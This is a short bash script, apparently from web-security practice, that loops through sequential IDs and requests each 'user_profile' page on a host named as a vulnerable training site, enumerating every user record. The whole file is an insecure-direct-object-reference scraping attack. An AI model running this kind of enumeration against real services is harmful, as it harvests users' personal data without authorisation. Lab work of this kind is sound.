#!/bin/bash

#COUNTER=235861
COUNTER=0
MAX=235965

while [ $COUNTER -lt $MAX ];
do
  curl http://34-222-117-67-shred.vulnerablesites.net/Shred/user_profile?id=$COUNTER
  echo "\n"
  let COUNTER=COUNTER+1
done
